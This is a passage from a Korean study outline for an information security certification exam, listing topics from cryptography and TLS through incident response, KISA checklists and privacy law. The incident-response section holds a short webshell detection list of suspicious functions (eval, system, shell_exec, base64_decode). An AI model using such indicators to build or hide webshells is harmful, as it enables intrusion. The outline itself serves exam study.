- ★ RSA 계산(p, q, n, φ(n), e, d), ★ DH 공유키 계산(★ g^ab mod p)
- ★ 해시(MD5 128, SHA-1 160, SHA-256, SHA-512, HAS-160), 역상·제2역상·충돌 저항성, 생일 공격
- ★ 해시 함수 정의(고정 길이 출력, 역산 불가) (26-1)
- MAC, ★ HMAC, CMAC, MAC vs MDC vs 전자서명
- ★ 전자서명(위조 불가, 서명자 인증, 부인 방지, 변경 불가, 재사용 불가)
- 하이브리드 암호(세션 키 + 공개키), 전자봉투
- 암호 분석 방법(암호문 단독, 기지 평문, 선택 평문, 선택 암호문), ★ 러버 호스 공격
- ★ 비밀번호 저장(솔트 + 키 스트레칭, bcrypt, scrypt, PBKDF2, Argon2)
- 스테가노그래피, 워터마킹, 포렌식 마킹, ★ 코드 난독화(구획, 제어 흐름, 데이터, 예방)

## 3-9. PKI·SSL/TLS
- ★ PKI(CA, RA, 저장소, ★ CRL)
- SET, 이중 서명
- 신뢰 모델(계층, 네트워크, 신뢰의 웹), 인증서 체인, 루트 인증서
- ★ SSL/TLS(Handshake, Record, Alert, Change Cipher Spec 프로토콜), Handshake 순서(ClientHello → ServerHello → Certificate → ServerKeyExchange → ServerHelloDone → ClientKeyExchange → ChangeCipherSpec → Finished)
- ★ SSL/TLS에서 비대칭키(서버 인증, 프리마스터 시크릿 교환)와 대칭키(데이터 암호화) 사용 단계 (26-1)
- TLS 1.3(1-RTT, ★ 0-RTT, PFS, RSA 키 교환 제거), DTLS
- ★ Heartbleed, ★ POODLE, BEAST, CRIME, FREAK, Logjam, DROWN
- ★ SSL Pinning(인증서 고정, MITM 방지, Frida·Objection 우회) (25-2)
- HSTS, SSL Strip

## 3-10. 인증·접근 관리
- 인증 요소(지식, 소유, 존재(생체), 행위), 2FA·MFA, OTP(HOTP, TOTP)
- 생체 인증 특성(보편성, 유일성, 지속성, 성능, 수용성, 저항성)
- ★ 생체 인식 정보 보호 6원칙(비례성, 적법성, 목적 제한, 투명성, 안전성, 통제권 보장) (26-1)
- ★ Kerberos(★ KDC = AS + TGS, ★ TGT, ★ 서비스 티켓, AS-REQ·AS-REP, TGS-REQ·REP, AP-REQ), 타임스탬프, SPOF
- Needham-Schroeder, 챌린지-리스폰스
- SSO, ★ OAuth 2.0(Authorization Code, Access Token, Refresh Token, Redirect URI), OpenID Connect, SAML
- ★ JWT(★ Header, ★ Payload, ★ Signature), `alg: none` 공격
- FIDO, 패스키
- ★ EAM / IAM(계정 생명 주기 자동화) (25-4), IGA, PAM(특권 계정 관리)

## 3-11. 소프트웨어 개발 보안
- ★ KISA 보안약점 7가지(입력 데이터 검증 및 표현, 보안 기능, 시간 및 상태, 에러 처리, 코드 오류, 캡슐화, API 오용)
- ★ 하드코딩된 중요 정보, ★ 취약한 비밀번호 암호화 알고리즘, 부적절한 인가, 적절하지 않은 난수, 오류 메시지 정보 노출, 시스템 데이터 노출, 디버그 코드, 종료되지 않은 반복문, 널 포인터 역참조, 자원 해제
- ★ OWASP Top 10(2021: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration, Vulnerable Components, Authentication Failures, Integrity Failures, Logging Failures, SSRF)
- OWASP Mobile Top 10, OWASP LLM Top 10
- 시큐어 코딩 예시 판독(Java `PreparedStatement`, `Runtime.exec`, `File` 경로, C `strcpy`)
- ★ 블랙박스 / ★ 화이트박스 / 그레이박스 테스트, ★ 퍼징(AI 퍼징) (26-1)
- SAST, DAST, IAST, SCA, SBOM, 시큐어 SDLC
- 모의 해킹, 침투 테스트, ★ PTES, BAS

## 3-12. 모바일 보안
- ★ 딥링크 취약점, 앱 링크
- 루팅·탈옥 탐지, 앱 위변조(리패키징), 무결성 검증, 코드 난독화(ProGuard)
- ★ SSL Pinning
- 안드로이드 구성 요소(Activity, Service, Broadcast Receiver, Content Provider), AndroidManifest.xml(exported, debuggable, allowBackup)
- 안전하지 않은 저장소(SharedPreferences), 키스토어·키체인
- ★ BYOD(★ MDM, ★ 컨테이너화, ★ 모바일 가상화) (25-4), MAM

---

# 4. 침해사고 분석·대응·최신 동향

## 4-1. 공격 모델·위협 정보
- ★ 사이버 킬 체인 7단계(정찰, 무기화, 전달, 익스플로잇, 설치, C&C, 목표 달성) (25-1)
- ★ MITRE ATT&CK(전술, 기술, 절차 TTP), Pyramid of Pain, Diamond Model
- ★ APT, ★ 공급망 공격, ★ 제로데이 (25-4), N-day, 워터링 홀, DBD(드라이브 바이 다운로드), ★ 멀버타이징, ★ Exploit Kit(Magnitude)
- IoC, TI(위협 인텔리전스), STIX·TAXII
- ★ CVE(CVE-연도-번호), ★ CVSS, CWE, CPE, KEV, EPSS, NVD
- 버그 바운티, 취약점 공개 정책

## 4-2. 침해사고 대응
- 사고 대응 7단계(사전 준비, 사고 탐지, 초기 대응, 대응 전략 체계화, 사고 조사, 보고서 작성, 해결)
- NIST 대응 4단계(준비, 탐지·분석, 봉쇄·근절·복구, 사후 활동)
- CERT·CSIRT, KISA 신고(침해사고 신고 의무)
- 증거 보존, 격리, 원인 분석, 재발 방지
- 웹셸 탐지(파일 생성 시간, 의심 함수 `eval`, `system`, `shell_exec`, `base64_decode`)
- 로그로 공격 재구성(시나리오 4 참고)
- 침해 사고 시나리오(리버스 셸, 루트킷, DBD, 악성코드 행위 분석, 워터링 홀)
- ★ 웹 access 로그로 웹셸 업로드 판단과 대응(화이트리스트, 업로드 디렉터리 실행 권한 제거, 웹 루트 외부 저장) (26-2)
- 파일 시각 분석, 유출량 산정, 랜섬웨어 복구

## 4-3. 기술적 취약점 분석·평가(KISA 주요정보통신기반시설 상세 가이드)
- 유닉스 서버 항목(U-01~): root 원격 접속 제한, 패스워드 복잡도, 계정 잠금 임계값, 패스워드 파일 보호, root 홈·PATH 설정, 소유자 없는 파일, `/etc/passwd`·`shadow`·`hosts`·`(x)inetd.conf`·`syslog.conf`·`services` 권한, SUID·SGID 점검, 환경 파일 권한, world-writable 파일, `/dev` 내 존재하지 않는 device, ★ `.rhosts`·`hosts.equiv`, 접속 IP·포트 제한, crond 권한, Finger·Anonymous FTP·r 계열·DoS 취약 서비스 비활성화, NFS, automountd, RPC, NIS, tftp·talk, Sendmail 버전·릴레이·일반 사용자 q 옵션 제한, DNS 보안 패치·Zone Transfer, 웹 서비스 디렉터리 리스팅·상위 디렉터리 접근·불필요 파일·링크 사용·업로드 용량 제한·영역 분리, ssh 사용, ftp 계정 셸 제한, ftpusers, at 권한, SNMP 커뮤니티, 로그온 경고 메시지, 로그 정기 검토, 정책에 따른 로깅
- 윈도우 서버 항목(W-): Administrator 계정 이름 변경, Guest 비활성화, 불필요 계정, 계정 잠금, 공유 권한, 하드디스크 기본 공유 제거, 불필요 서비스, IIS 디렉터리 리스팅·CGI·상위 경로·가상 디렉터리, NetBIOS 바인딩, FTP, DNS Zone Transfer, RDS, 원격 터미널 타임아웃, 백신·패치, 원격 레지스트리, 로그 감사
- 네트워크 장비 항목(N-): 패스워드 설정·복잡도·암호화, VTY 접근 제한, 세션 타임아웃, 최신 패치, SNMP, 로깅, NTP, 불필요 서비스(TCP·UDP small server, Finger, HTTP, CDP, Directed-broadcast, Source Routing, Proxy ARP, ICMP Unreachable·Redirect)
- 보안 장비 항목(S-): 기본 계정 변경, 기본 패스워드 변경, 계정별 권한 설정, 미사용 계정 제거, 보안 장비 원격 관리 접근 통제, 로그 설정, 정책 관리
- DBMS 항목(D-), PC 항목(PC-), 웹 애플리케이션 항목(코드 인젝션, SQL 인젝션, XSS, CSRF, 파일 업로드·다운로드, 불충분한 인증·인가, 세션 관리 등 21개)

## 4-4. 클라우드·가상화
- ★ IaaS / ★ PaaS / ★ SaaS, ★ 공동 책임 모델
- ★ AWS CloudTrail(API 감사 로그), CloudWatch, GuardDuty, VPC, 보안 그룹, NACL, S3 버킷 공개 설정
- IAM(Role, Policy, 최소 권한, 액세스 키 관리), ★ IMDSv1 / ★ IMDSv2(세션 토큰, SSRF 대응)
- CASB, CSPM, CWPP, CNAPP, SASE, ZTNA
- SecaaS(클라우드 기반 보안 서비스)
- 컨테이너(Docker, 이미지 취약점, 권한 컨테이너), 쿠버네티스(RBAC, Secret)
- 하이퍼바이저(Type 1·2), VM Escape
- DevSecOps, IaC 보안

## 4-5. AI·신기술
- ★ AI 공격(★ 프롬프트 인젝션, ★ 데이터 포이즈닝, ★ 회피 공격(적대적 예제), ★ 모델 인버전·학습 데이터 추출, 모델 탈취, 탈옥)
- 딥페이크, AI 피싱
- ★ 제로 트러스트(Never Trust Always Verify, 마이크로 세그멘테이션, 최소 권한, 지속 검증)
- IoT 보안, OT·ICS·SCADA 보안
- ★ TEMPEST

## 4-6. 최근 보안 이슈 이름
- ★ BPFDoor, ★ React2Shell(CVE-2025-55182), ★ Log4Shell(CVE-2021-44228), ★ Heartbleed(CVE-2014-0160), Shellshock, EternalBlue·WannaCry, PrintNightmare, Follina, MOVEit, XZ Utils 백도어
- ★ Meltdown / Spectre
- RDP 공격, VPN 장비 취약점 공격

---

# 5. 정보보안 일반·관리·법규

## 5-1. 기본 개념
- ★ 기밀성 / 무결성 / 가용성, 인증성, 책임 추적성, 부인 방지
- ★ 인증(Authentication) / ★ 인가(Authorization) / ★ 책임 추적(Accounting)
- 식별 → 인증 → 인가 → 책임 추적
- ★ 위협 / ★ 취약점 / ★ 위험
- 보안 원칙(최소 권한, 직무 분리, 알 필요성, 심층 방어, 실패 시 안전)

## 5-2. 보호대책·통제
- ★ 예방 / ★ 탐지 / ★ 교정 통제, 억제·복구·보상 통제
- ★ 관리적 / ★ 물리적 / ★ 기술적(논리적) 통제 (25-4)
- ★ 물리적 접근 통제(잠금 장치, 방문자 기록·동행, 배지, CCTV, 이중 출입문, 맨트랩)
- ★ 정책 / ★ 표준 / 지침 / 절차, 기준선
- 보안 인식 교육, 보안 서약서

## 5-3. 접근 통제
- ★ DAC(신분 기반, 소유자 재량, ACL) / ★ MAC(규칙 기반, 보안 등급·레이블) / ★ RBAC(역할 기반)
- ACL(객체 기준) / CL(주체 기준), 접근 통제 행렬
- 보안 모델: BLP(No Read Up, No Write Down, 기밀성), Biba(No Read Down, No Write Up, 무결성), Clark-Wilson, Chinese Wall
- 참조 모니터, 보안 커널, TCB

## 5-4. 위험 관리
- ★ 위험 구성 요소(★ 자산, ★ 위협, ★ 취약성, ★ 정보보호대책), 잔여 위험
- ★ 위험 관리 단계(위험 식별 → 위험 분석 → 위험 평가 → 대책 선정 → 대책 계획 수립 → 대책 구현) (26-1)
- ★ 취약성 평가 (26-2)
- ★ 위험 관리 절차(★ 위험 관리 계획, ★ 자산 식별·★ 자산 가치 평가, 위협 평가, 취약성 평가, 기존 대책 평가, 위험 평가, 대책 선정, 구현, 사후 관리) (25-1, 25-4)
- ★ 위험 분석 접근법(★ 기준선(베이스라인), 비정형(전문가 판단), ★ 상세 위험 분석, ★ 복합 접근법) (25-2)
- ★ 정량적 분석(★ EF, SLE = 자산가치 × EF, ARO, ★ ALE = SLE × ARO, 과거 자료 분석법, ★ 수학 공식 접근법, 확률 분포법)
- ★ 정성적 분석(★ 델파이법 (25-4), ★ 시나리오법, ★ 순위 결정법, 퍼지 행렬법)
- ★ 위험 대응(★ 수용, ★ 감소, ★ 회피, ★ 전가) (25-2)
- ★ DoA(수용 가능 위험 수준)
- ★ 정보 자산 중요도(기밀성, 무결성, 가용성, 법적 준거성), 자산 그룹핑 (25-1)
- 비용 대비 효과 분석

## 5-5. 업무 연속성
- ★ BCP (26-2) / DRP, ★ BIA(업무 영향 분석)
- BCP 단계(프로젝트 범위 설정, BIA, 복구 전략 개발, 계획 수립, 테스트·유지보수)
- ★ RTO / ★ RPO, MTBF / MTTR
- ★ 복구 사이트(★ 미러(Active-Active), 핫(Active-Standby), ★ 웜, ★ 콜드), 상호 협정
- 백업(전체, 증분(백업 빠름·복구 느림), 차등(백업 느림·복구 빠름)), 3-2-1 백업 규칙, 소산 백업
- 재해 복구 훈련(체크리스트, 모의 훈련, 병행 테스트, 전면 중단 테스트)

## 5-6. 정보보호 관리 체계
- ★ ISMS-P 인증 기준(★ 관리 체계 수립 및 운영 16 / 보호대책 요구사항 64 / 개인정보 처리 단계별 요구사항 22, ISMS는 앞 두 영역 80개)
- ★ 관리 체계 수립 및 운영 4단계(관리 체계 기반 마련 → 위험 관리 → 관리 체계 운영 → 관리 체계 점검 및 개선)
- ★ ISMS-P 통제 번호(1.1.1 경영진 참여, 1.2.1 정보 자산 식별, 1.2.3 위험 평가, 2.2.3 보안 서약, 2.2.5 퇴직 및 직무 변경 관리, 2.5 인증 및 권한 관리, 2.9.4 로그 및 접속 기록 관리, 2.9.5 로그 및 접속 기록 점검, 2.11.3 이상 행위 분석 및 모니터링, 2.12 재해 복구)
- 인증 심사 종류(최초 심사, 사후 심사(연 1회), 갱신 심사(3년)), 의무 대상자
- PDCA, ISO/IEC 27001·27002·27701
- ★ 정보보호 거버넌스, ★ CISO, CPO, 정보보호 위원회
- ★ CISO 역할(정보보호 계획 수립·시행·개선, 실태 감사·개선, 위험 식별·평가·대책 마련, 교육·모의 훈련) (26-1)
- ★ 정보보호 정책(최상위 문서), 정보보호 공시

## 5-7. 평가·인증 제도
- ★ CC 인증(★ PP(보호 프로파일), ST(보안 목표 명세서), TOE, EAL 1~7)
- 보안 기능 확인서, GS 인증
- 클라우드 보안 인증(CSAP)
- 개인정보 영향 평가(PIA, ★ 위험도 산정 공식)

## 5-8. 개인정보 보호법
- ★ 개인정보 / 가명 정보 / 익명 정보, ★ 개인정보 처리자 / ★ 개인정보 취급자, 정보 주체, 수탁자
- ★ 고유 식별 정보 4종(주민등록번호, 여권 번호, 운전면허 번호, 외국인 등록 번호), 민감 정보, 바이오 정보
- 개인정보 보호 원칙(8가지), 정보 주체의 권리(열람, 정정·삭제, 처리 정지, 동의 철회, 자동화된 결정 거부)
- 수집·이용 요건(동의, 법률, 계약, 급박한 생명·신체, 정당한 이익)
- ★ 동의 고지 사항(수집·이용: 목적, 항목, 보유 기간, 거부 권리·불이익)
- ★ 제3자 제공 동의 고지 5항목(제공받는 자, 이용 목적, 항목, 보유 기간, 거부 권리·불이익)
- 위탁(공개) vs 제3자 제공(동의), 국외 이전, 외부자 보안
- 파기(지체 없이, 5일 이내), 분리 보관
- 유출 통지·신고(72시간 이내, 1천 명 이상·민감·고유 식별 정보 등), 침해 사고 개선 조치
- ★ 영상 정보 처리 기기(제25조: 설치 목적·장소, 촬영 범위·시간, 관리 책임자, 수탁자 안내판)
- 개인정보 보호 책임자(CPO) 지정, 개인정보 처리 방침
- ★ 가명 처리 기법(★ 랜덤 라운딩, 총계 처리, 마스킹, 범주화, 삭제, 암호화, 잡음 추가, 순열)
- 개인정보 보호 위원회, 과징금·과태료

## 5-9. 개인정보의 안전성 확보 조치 기준
- ★ 내부 관리 계획(제4조, 수립·시행·연 1회 점검)
- ★ 접근 권한을 설정할 수 있는 취급자, 개인정보를 다운로드·파기할 수 있는 취급자(일일 평균 이용자 100만 명 이상 처리자는 이들의 컴퓨터에 인터넷망 차단 조치, 2025 개정으로 제6조의2로 옮기고 위험 분석 시 예외 허용, 민감·고유 식별 정보 등 다운로드·파기 기기는 예외 없음) (26-2)
- 접근 권한 관리(최소 권한, 퇴직 시 지체 없이 말소, ★ 부여·변경·말소 기록 3년 보관)
- 접근 통제(★ 외부 접속 시 안전한 인증 수단, 침입 차단·탐지, 일정 시간 후 접속 차단, P2P 차단, 인터넷 망 차단 조치)
- 비밀번호 작성 규칙
- 암호화(고유 식별 정보·비밀번호·바이오 정보, 비밀번호는 일방향 암호화, 전송 시 암호화)
- ★ 접속 기록 보관·점검(2025 개정으로 대상이 취급자 → 시스템에 접속한 자(정보주체 제외), ★ 1년 이상, 5만 명 이상·고유 식별 정보·민감 정보 처리 시스템은 2년 이상, 점검 주기는 2025-10-31 개정으로 월 1회 이상 → 내부 관리 계획에 정한 주기)
- 악성 프로그램 방지, ★ 물리적 안전 조치(출입 통제, 보조 저장 매체), 재해·재난 대비, 출력·복사 시 보호, 파기

## 5-10. 기타 법규
- ★ 정보통신망법(★ 정보통신망 정의 (25-2), ★ 집적 정보 통신 시설 사업자 (26-1), 정보통신 서비스 제공자, 침해사고 신고, 영리 목적 광고성 정보 전송(옵트인), 불법 정보)
- ★ 정보통신 기반 보호법(주요 정보 통신 기반 시설 지정, 취약점 분석·평가, ★ 정보 공유·분석 센터(ISAC))
- 전자서명법, 위치정보법, 전자정부법, 신용정보법, 클라우드 컴퓨팅법
- 개인정보의 기술적·관리적 보호조치 기준(현재 안전성 확보 조치 기준으로 통합)
- 정보보안 윤리, 저작권

---

# 부록. 2027년 신 출제기준 추가 항목

2026년 응시에는 해당하지 않는다. 2024~2026 기출에 한 번도 나오지 않았다.

- EDR vs EPP(백신)
- REST API 보안, OWASP API Security Top 10, API 인가(BOLA), CORS
- 점검 이력 기반 반복 취약점·미조치 추이 분석
- 클라우드·가상화 환경의 운영체제 특성, 클라우드 네트워크(VPC, Security Group)
- 양자 내성 암호, 동형 암호, 경량 암호
- 개인정보 유출 사고 원인과 유출 위협 요인
